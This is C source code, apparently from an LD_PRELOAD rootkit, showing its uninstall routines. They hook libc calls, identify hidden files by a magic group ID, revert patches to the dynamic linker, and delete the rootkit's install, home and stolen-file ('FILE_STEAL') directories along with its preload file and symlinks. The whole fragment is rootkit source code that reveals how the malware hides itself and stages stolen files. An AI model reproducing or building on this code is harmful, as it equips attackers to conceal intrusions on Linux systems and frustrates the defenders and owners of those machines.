#ifdef UNINSTALL_MY_ASS
void uninstallass(void){
    FILE *fp;
    struct stat assstat, assdirstat;
    gid_t magicgid;

    hook(CFOPEN, C__XSTAT, CUNLINK);

    fp = call(CFOPEN, ASS_PATH, "r");

    if(fp != NULL){
        char line[PATH_MAX];
        memset(line, 0, sizeof(line));
        magicgid = readgid();
        while(fgets(line, sizeof(line), fp) != NULL){
            line[strlen(line)-1]='\0';

            memset(&assstat, 0, sizeof(struct stat));
            if((long)call(C__XSTAT, _STAT_VER, line, &assstat) < 0)
                continue;

            if(assstat.st_gid != magicgid)
                continue;

            if(!S_ISDIR(assstat.st_mode))
                call(CUNLINK, line);
            else
                eradicatedir(line);

            char *assdirname = dirname(line);
            if(assdirname == NULL) continue;
            memset(&assdirstat, 0, sizeof(struct stat));

            if((long)call(C__XSTAT, _STAT_VER, assdirname, &assdirstat) < 0)
                continue;

            if(assdirstat.st_gid == magicgid && S_ISDIR(assdirstat.st_mode))
                eradicatedir(assdirname);
        }

        fclose(fp);
    }
}
#endif

void uninstallbdv(void){
#ifdef PATCH_DYNAMIC_LINKER
    for(int i = 0; i != LDPATHS_SIZE; i++)
        ldpatch(ldpaths[i], PRELOAD_FILE, OLD_PRELOAD, MAGICUSR);
#endif
#ifdef FILE_STEAL
    eradicatedir(INTEREST_DIR);
#endif
    eradicatedir(INSTALL_DIR);
    eradicatedir(HOMEDIR);
#ifdef UNINSTALL_MY_ASS
    uninstallass();
#endif

    hook(CUNLINK);
    int unlinkr;
    char *preloadpath = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    preloadpath = PRELOAD_FILE;
#endif
    unlinkr = (long)call(CUNLINK, preloadpath);
    if(unlinkr < 0 && errno != ENOENT)
        printf("Failed removing preload file\n");

    char *src, *dest;
    for(int i = 0; i != LINKSRCS_SIZE; i++){
        src = linksrcs[i];
        dest = linkdests[i];

        if((long)call(CUNLINK, src) < 0 && errno != ENOENT)
            printf("Failed removing %s (%s)\n", src, basename(dest));
    }
}